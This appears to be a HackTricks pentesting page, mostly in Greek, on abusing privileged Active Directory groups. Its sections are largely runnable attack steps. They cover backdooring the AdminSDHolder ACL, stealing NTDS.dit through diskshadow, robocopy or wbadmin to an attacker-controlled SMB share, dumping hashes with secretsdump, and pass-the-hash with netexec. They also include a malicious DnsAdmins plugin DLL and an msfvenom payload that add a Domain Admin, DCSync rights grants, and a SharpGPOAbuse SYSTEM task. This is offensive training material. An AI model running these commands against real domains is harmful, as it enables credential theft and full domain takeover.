# Privileged Groups

{{#include ../../banners/hacktricks-training.md}}

## Well Known groups με δικαιώματα διαχείρισης

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Αυτή η ομάδα έχει τη δυνατότητα να δημιουργεί accounts και groups που δεν είναι administrators στο domain. Επιπλέον, επιτρέπει τοπικό login στο Domain Controller (DC).

Για τον εντοπισμό των μελών αυτής της ομάδας, εκτελείται η ακόλουθη εντολή:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Η προσθήκη νέων χρηστών επιτρέπεται, όπως και το local login στο DC.<sup>[[1]](#references)</sup>

## ομάδα AdminSDHolder

Το Access Control List (ACL) της ομάδας **AdminSDHolder** είναι κρίσιμο, καθώς ορίζει τα permissions για όλες τις "protected groups" στο Active Directory, συμπεριλαμβανομένων των ομάδων με υψηλά προνόμια. Αυτός ο μηχανισμός διασφαλίζει αυτές τις ομάδες, αποτρέποντας μη εξουσιοδοτημένες τροποποιήσεις.

Ένας attacker θα μπορούσε να το εκμεταλλευτεί τροποποιώντας το ACL της ομάδας **AdminSDHolder** και παραχωρώντας full permissions σε έναν standard user. Αυτό θα έδινε ουσιαστικά σε αυτόν τον χρήστη πλήρη έλεγχο σε όλες τις protected groups. Αν τα permissions αυτού του χρήστη τροποποιηθούν ή αφαιρεθούν, θα επανέλθουν αυτόματα μέσα σε μία ώρα, λόγω του σχεδιασμού του συστήματος.<sup>[[14]](#references)</sup>

Η πρόσφατη τεκμηρίωση του Windows Server εξακολουθεί να θεωρεί αρκετές ενσωματωμένες operator groups ως **protected** objects (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, κ.λπ.). Η διαδικασία **SDProp** εκτελείται στον **PDC Emulator** κάθε 60 λεπτά από προεπιλογή, ορίζει `adminCount=1` και απενεργοποιεί το inheritance σε protected objects. Αυτό είναι χρήσιμο τόσο για persistence όσο και για τον εντοπισμό stale privileged users που αφαιρέθηκαν από μια protected group, αλλά εξακολουθούν να διατηρούν το non-inheriting ACL.<sup>[[12]](#references)</sup>

Οι εντολές για τον έλεγχο των μελών και την τροποποίηση των permissions περιλαμβάνουν:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
Ένα script είναι διαθέσιμο για την επίσπευση της διαδικασίας επαναφοράς: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Για περισσότερες λεπτομέρειες, επισκεφθείτε το [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

Η συμμετοχή σε αυτό το group επιτρέπει την ανάγνωση διαγραμμένων αντικειμένων του Active Directory, γεγονός που μπορεί να αποκαλύψει ευαίσθητες πληροφορίες:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
Αυτό είναι χρήσιμο για την **ανάκτηση προηγούμενων διαδρομών προνομίων**. Τα διαγραμμένα αντικείμενα μπορούν ακόμη να αποκαλύψουν τα `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, παλιά SPNs ή το DN μιας διαγραμμένης privileged group, η οποία μπορεί αργότερα να αποκατασταθεί από άλλον operator.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Πρόσβαση στον Domain Controller

Η πρόσβαση σε αρχεία στον DC είναι περιορισμένη, εκτός αν ο χρήστης ανήκει στην ομάδα `Server Operators`, γεγονός που αλλάζει το επίπεδο πρόσβασης.

### Privilege Escalation

Χρησιμοποιώντας το `PsService` ή το `sc` από το Sysinternals, μπορεί κανείς να ελέγξει και να τροποποιήσει τα δικαιώματα υπηρεσιών. Η ομάδα `Server Operators`, για παράδειγμα, έχει πλήρη έλεγχο σε ορισμένες υπηρεσίες, επιτρέποντας την εκτέλεση αυθαίρετων εντολών και Privilege Escalation:<sup>[[1]](#references)</sup>
```cmd
C:\> .\PsService.exe security AppReadiness
```
Αυτή η εντολή αποκαλύπτει ότι οι `Server Operators` έχουν πλήρη πρόσβαση, επιτρέποντας τον χειρισμό services για την απόκτηση elevated privileges.

## Backup Operators

Η συμμετοχή στην ομάδα `Backup Operators` παρέχει πρόσβαση στο file system του `DC01` χάρη στα privileges `SeBackup` και `SeRestore`. Αυτά τα privileges επιτρέπουν τη διάσχιση φακέλων, την καταχώριση και την αντιγραφή αρχείων, ακόμη και χωρίς explicit permissions, με τη χρήση του flag `FILE_FLAG_BACKUP_SEMANTICS`. Για αυτήν τη διαδικασία απαιτείται η χρήση συγκεκριμένων scripts.<sup>[[1]](#references)</sup>

Για να εμφανίσετε τα μέλη της ομάδας, εκτελέστε:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Τοπική επίθεση

Για την αξιοποίηση αυτών των προνομίων τοπικά, χρησιμοποιούνται τα ακόλουθα βήματα:

1. Εισαγωγή των απαραίτητων βιβλιοθηκών:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Ενεργοποίηση και επαλήθευση του `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Πρόσβαση και αντιγραφή αρχείων από περιορισμένους καταλόγους, για παράδειγμα:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

Η άμεση πρόσβαση στο file system του Domain Controller επιτρέπει την κλοπή της βάσης δεδομένων `NTDS.dit`, η οποία περιέχει όλα τα NTLM hashes για τους χρήστες και τους υπολογιστές του domain.

#### Χρήση του diskshadow.exe

1. Δημιουργήστε ένα shadow copy του drive `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Αντιγράψτε το `NTDS.dit` από το shadow copy:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Εναλλακτικά, χρησιμοποιήστε το `robocopy` για την αντιγραφή αρχείων:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Εξαγωγή των `SYSTEM` και `SAM` για ανάκτηση hashes:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Ανάκτηση όλων των hashes από το `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Μετά την εξαγωγή: Pass-the-Hash σε DA<sup>[[11]](#references)</sup>
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Χρήση του wbadmin.exe

1. Ρυθμίστε το filesystem NTFS για τον SMB server στο attacker machine και αποθηκεύστε τα SMB credentials στο target machine.
2. Χρησιμοποιήστε το `wbadmin.exe` για system backup και εξαγωγή του `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Για μια πρακτική επίδειξη, δείτε το [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Τα μέλη της ομάδας **DnsAdmins** μπορούν να εκμεταλλευτούν τα privileges τους για να φορτώσουν ένα arbitrary DLL με privileges SYSTEM σε έναν DNS server, ο οποίος συχνά φιλοξενείται σε Domain Controllers. Αυτή η δυνατότητα επιτρέπει σημαντικές δυνατότητες exploitation.

Για να παραθέσετε τα μέλη της ομάδας DnsAdmins, χρησιμοποιήστε:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Εκτέλεση αυθαίρετου DLL (CVE‑2021‑40469)

> [!NOTE]
> Αυτή η ευπάθεια επιτρέπει την εκτέλεση αυθαίρετου κώδικα με δικαιώματα SYSTEM στην υπηρεσία DNS (συνήθως μέσα στα DCs). Το ζήτημα διορθώθηκε το 2021.

Τα μέλη μπορούν να κάνουν τον διακομιστή DNS να φορτώσει ένα αυθαίρετο DLL (είτε τοπικά είτε από ένα remote share) χρησιμοποιώντας εντολές όπως:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Η επανεκκίνηση της υπηρεσίας DNS (η οποία ενδέχεται να απαιτεί επιπλέον δικαιώματα) είναι απαραίτητη για τη φόρτωση του DLL:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Για περισσότερες λεπτομέρειες σχετικά με αυτό το attack vector, ανατρέξτε στο ired.team.

#### Mimilib.dll

Είναι επίσης εφικτό να χρησιμοποιηθεί το mimilib.dll για command execution, τροποποιώντας το ώστε να εκτελεί συγκεκριμένες εντολές ή reverse shells. [Ελέγξτε αυτήν την ανάρτηση](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) για περισσότερες πληροφορίες.<sup>[[15]](#references)</sup>

### WPAD Record για MitM

Οι DNSAdmins μπορούν να χειραγωγήσουν τα DNS records για να πραγματοποιήσουν επιθέσεις Man-in-the-Middle (MitM), δημιουργώντας ένα WPAD record αφού απενεργοποιήσουν την global query block list. Εργαλεία όπως τα Responder ή Inveigh μπορούν να χρησιμοποιηθούν για spoofing και capturing network traffic.

### Event Log Readers
Τα μέλη μπορούν να έχουν πρόσβαση στα event logs, εντοπίζοντας δυνητικά ευαίσθητες πληροφορίες, όπως plaintext passwords ή λεπτομέρειες εκτέλεσης εντολών:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

Αυτή η ομάδα μπορεί να τροποποιήσει τα DACLs στο αντικείμενο του domain, εκχωρώντας ενδεχομένως δικαιώματα DCSync. Οι τεχνικές για privilege escalation που εκμεταλλεύονται αυτήν την ομάδα περιγράφονται στο GitHub repo Exchange-AD-Privesc.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
Εάν μπορείτε να ενεργήσετε ως μέλος αυτής της ομάδας, η κλασική κατάχρηση είναι να εκχωρήσετε σε ένα principal που ελέγχεται από τον attacker τα δικαιώματα αναπαραγωγής που απαιτούνται για το [DCSync](dcsync.md):
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Ιστορικά, το **PrivExchange** συνέδεε την πρόσβαση σε mailbox, το coerced Exchange authentication και το LDAP relay, για να επιτύχει πρόσβαση σε αυτό το ίδιο primitive. Ακόμη και όταν αυτή η relay διαδρομή έχει μετριαστεί, η άμεση συμμετοχή στο `Exchange Windows Permissions` ή ο έλεγχος ενός Exchange server παραμένει διαδρομή υψηλής αξίας προς δικαιώματα domain replication.

## Hyper-V Administrators

Οι Hyper-V Administrators έχουν πλήρη πρόσβαση στο Hyper-V, η οποία μπορεί να αξιοποιηθεί για την απόκτηση ελέγχου σε virtualized Domain Controllers. Αυτό περιλαμβάνει την κλωνοποίηση ενεργών DCs και την εξαγωγή NTLM hashes από το αρχείο NTDS.dit.

### Παράδειγμα Exploitation

Η πρακτική κατάχρηση συνήθως αφορά **offline πρόσβαση σε DC disks/checkpoints** και όχι παλιά host-level LPE tricks. Με πρόσβαση στο Hyper-V host, ένας operator μπορεί να δημιουργήσει checkpoint ή να εξαγάγει έναν virtualized Domain Controller, να κάνει mount το VHDX και να εξαγάγει τα `NTDS.dit`, `SYSTEM` και άλλα secrets χωρίς να αγγίξει το LSASS μέσα στο guest:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
From εκεί, επαναχρησιμοποιήστε το workflow των `Backup Operators` για να αντιγράψετε το `Windows\NTDS\ntds.dit` και τα registry hives offline.

## Group Policy Creators Owners

Αυτή η ομάδα επιτρέπει στα μέλη να δημιουργούν Group Policies στο domain. Ωστόσο, τα μέλη της δεν μπορούν να εφαρμόζουν group policies σε users ή groups ούτε να επεξεργάζονται υπάρχοντα GPOs.

Η σημαντική λεπτομέρεια είναι ότι ο **creator γίνεται owner του νέου GPO** και συνήθως αποκτά αρκετά δικαιώματα ώστε να το επεξεργαστεί στη συνέχεια. Αυτό σημαίνει ότι αυτή η ομάδα είναι ενδιαφέρουσα όταν μπορείτε είτε να:

- δημιουργήσετε ένα malicious GPO και να πείσετε έναν admin να το συνδέσει με ένα target OU/domain
- επεξεργαστείτε ένα GPO που δημιουργήσατε και είναι ήδη συνδεδεμένο κάπου χρήσιμα
- κάνετε abuse ενός άλλου delegated right που σας επιτρέπει να συνδέετε GPOs, ενώ αυτή η ομάδα σας παρέχει τη δυνατότητα επεξεργασίας

Το πρακτικό abuse συνήθως σημαίνει την προσθήκη ενός **Immediate Task**, ενός **startup script**, membership σε **local admin**, ή μιας αλλαγής σε **user rights assignment** μέσω policy files που υποστηρίζονται από το SYSVOL.<sup>[[3]](#references)[[4]](#references)[[13]](#references)</sup>
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
Εάν επεξεργάζεστε χειροκίνητα το GPO μέσω του `SYSVOL`, θυμηθείτε ότι η αλλαγή από μόνη της δεν αρκεί: πρέπει επίσης να ενημερωθούν τα `versionNumber`, `GPT.ini` και, σε ορισμένες περιπτώσεις, το `gPCMachineExtensionNames`, διαφορετικά οι clients θα αγνοήσουν την ανανέωση της policy.<sup>[[9]](#references)</sup>

## Organization Management

Σε περιβάλλοντα όπου έχει αναπτυχθεί το **Microsoft Exchange**, μια ειδική ομάδα γνωστή ως **Organization Management** διαθέτει σημαντικές δυνατότητες. Αυτή η ομάδα έχει δικαιώματα **πρόσβασης στα mailboxes όλων των χρηστών του domain** και διατηρεί **πλήρη έλεγχο πάνω στο Organizational Unit (OU) 'Microsoft Exchange Security Groups'**. Αυτός ο έλεγχος περιλαμβάνει και την ομάδα **`Exchange Windows Permissions`**, η οποία μπορεί να γίνει αντικείμενο εκμετάλλευσης για privilege escalation.

### Privilege Exploitation and Commands

#### Print Operators

Τα μέλη της ομάδας **Print Operators** διαθέτουν αρκετά privileges, συμπεριλαμβανομένου του **`SeLoadDriverPrivilege`**, το οποίο τους επιτρέπει να **κάνουν log on τοπικά σε έναν Domain Controller**, να τον τερματίζουν και να διαχειρίζονται printers. Για την εκμετάλλευση αυτών των privileges, ειδικά εάν το **`SeLoadDriverPrivilege`** δεν είναι ορατό σε unelevated context, απαιτείται bypass του User Account Control (UAC).<sup>[[1]](#references)</sup>

Για την εμφάνιση των μελών αυτής της ομάδας χρησιμοποιείται η ακόλουθη εντολή PowerShell:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Σε Domain Controllers, αυτή η ομάδα είναι επικίνδυνη επειδή η προεπιλεγμένη Domain Controller Policy εκχωρεί το **`SeLoadDriverPrivilege`** στην `Print Operators`. Αν αποκτήσετε ένα elevated token για ένα μέλος αυτής της ομάδας, μπορείτε να ενεργοποιήσετε το privilege και να φορτώσετε έναν signed-but-vulnerable driver για να μεταβείτε σε kernel/SYSTEM.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)</sup> Για λεπτομέρειες σχετικά με τη διαχείριση token, ανατρέξτε στο [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

Στα μέλη αυτής της ομάδας παρέχεται πρόσβαση σε PCs μέσω του Remote Desktop Protocol (RDP). Για την απαρίθμηση αυτών των μελών, είναι διαθέσιμες εντολές PowerShell:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Περισσότερες πληροφορίες σχετικά με την εκμετάλλευση του RDP μπορούν να βρεθούν σε εξειδικευμένους πόρους pentesting.

#### Χρήστες απομακρυσμένης διαχείρισης

Τα μέλη μπορούν να αποκτούν πρόσβαση σε υπολογιστές μέσω του **Windows Remote Management (WinRM)**. Η απαρίθμηση αυτών των μελών επιτυγχάνεται μέσω:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Για τεχνικές exploitation που σχετίζονται με το **WinRM**, θα πρέπει να συμβουλευτείτε τη σχετική τεκμηρίωση.

#### Server Operators

Αυτή η ομάδα διαθέτει δικαιώματα για την εκτέλεση διαφόρων ρυθμίσεων σε Domain Controllers, συμπεριλαμβανομένων των δικαιωμάτων backup και restore, της αλλαγής της ώρας του συστήματος και του τερματισμού λειτουργίας του συστήματος.<sup>[[1]](#references)</sup> Για την απαρίθμηση των μελών, παρέχεται η ακόλουθη εντολή:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
Στους Domain Controllers, οι `Server Operators` συνήθως κληρονομούν επαρκή δικαιώματα για **αναδιαμόρφωση ή εκκίνηση/διακοπή υπηρεσιών** και επίσης λαμβάνουν τα `SeBackupPrivilege`/`SeRestorePrivilege` μέσω της προεπιλεγμένης πολιτικής DC. Στην πράξη, αυτό τους καθιστά γέφυρα μεταξύ **κατάχρησης ελέγχου υπηρεσιών** και **εξαγωγής NTDS**:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
Εάν ένα service ACL παρέχει σε αυτή την ομάδα δικαιώματα αλλαγής/εκκίνησης, κατευθύνετε το service σε μια αυθαίρετη εντολή, εκκινήστε το ως `LocalSystem` και, στη συνέχεια, επαναφέρετε το αρχικό `binPath`. Εάν ο έλεγχος των services είναι περιορισμένος, χρησιμοποιήστε εναλλακτικά τις παραπάνω τεχνικές των `Backup Operators` για να αντιγράψετε το `NTDS.dit`.

## Αναφορές

- [1] [ired.team – Privileged Accounts and Token Privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Abusing SeLoadDriverPrivilege for Privilege Escalation](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – Abusing GPO Permissions](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – GPO Abuse - Part 1](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – A Red Teamer's Guide to GPOs and OUs](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Undocumented NT Internals – NtLoadDriver Function](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [11] [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – Appendix C: Protected Accounts and Groups in Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – How to Abuse and Backdoor AdminSDHolder to Obtain Domain Admin Persistence](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Abusing DnsAdmins Privilege for Escalation in Active Directory](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)

{{#include ../../banners/hacktricks-training.md}}
